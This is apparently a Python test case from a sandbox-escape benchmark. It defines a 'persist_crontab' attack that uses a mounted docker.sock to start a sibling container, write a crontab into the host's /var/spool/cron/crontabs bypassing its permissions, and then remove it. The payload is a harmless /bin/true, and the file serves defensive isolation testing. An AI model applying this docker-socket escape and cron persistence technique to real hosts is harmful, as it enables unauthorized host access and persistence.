"""Persistence via crontab (LINUX.md catalogue: "... crontab outside the
sandbox"). Same escape vector as escape_docker_socket.py and persist_bashrc.py
-- a mounted docker.sock spawns a sibling container with a host bind-mount --
this time targeting /var/spool/cron/crontabs, the real per-user cron spool
directory, directly. That directory is mode 1730 owned by root:crontab
(confirmed live), which denies `bench` (not in the crontab group) any access
at all; a sibling container's root bypasses that outright, the same way
escape_docker_socket's sibling container bypasses host filesystem permissions
generally.

Writes a correctly-permissioned (root-owned, mode 600) crontab file for
`bench` with ONE schedule line: `/bin/true`, a command that does nothing --
even if cleanup somehow failed and this line survived, it would never do
anything if cron ever ran it. The group ID for the chown is read from the
mounted directory itself (`stat -c %g`) rather than hardcoded, since alpine's
own /etc/group has no "crontab" entry to resolve a name against, and the
numeric gid is what the host's cron daemon actually checks.

The same command removes the crontab file again immediately after touching
the escape marker. Verified live on sbx-test: `crontab -l -u bench` reports
"no crontab for bench" both before and after -- this never leaves a real
schedule entry active for any cron tick to pick up.
"""
from .base import Attack

ATTACK = Attack(
    name="persist_crontab",
    category="persistence",
    description="Use a mounted docker.sock to install (then remove) a no-op crontab entry for bench, outside the sandbox",
    targets=("docker", "gvisor"),  # same scope as escape_docker_socket -- see that module's docstring
    command=(
        "timeout {timeout_margin} docker run --rm "
        "-v /var/spool/cron/crontabs:/host_cron -v /var/sbx-bench:/var/sbx-bench "
        "alpine:3.20 sh -c "
        "'GID=$(stat -c %g /host_cron); "
        "echo \"* * * * * /bin/true # sbx-bench-persist-marker\" > /host_cron/bench && "
        "chown root:$GID /host_cron/bench && chmod 600 /host_cron/bench && "
        "touch {escape_marker} && rm -f /host_cron/bench'"
    ),
    config={
        "volumes": {"/var/run/docker.sock": "/var/run/docker.sock"},
        "image": "docker:27-cli",
    },
    timeout=20.0,
    notes=(
        "Misconfigured variant by construction, same as escape_docker_socket -- "
        "the config IS the vulnerability. Negative control (config=None): no "
        "docker client in the default image at all, fails outright before it "
        "can even attempt the mount.\n"
        "Verified live on sbx-test: /var/spool/cron/crontabs is mode 1730 "
        "root:crontab (gid 997 on this VM, read dynamically rather than "
        "hardcoded), which denies bench directly but not a sibling container's "
        "root; the crontab file is written, the escape marker touched, then "
        "the file removed -- `crontab -l -u bench` showed 'no crontab for "
        "bench' both before and after."
    ),
)
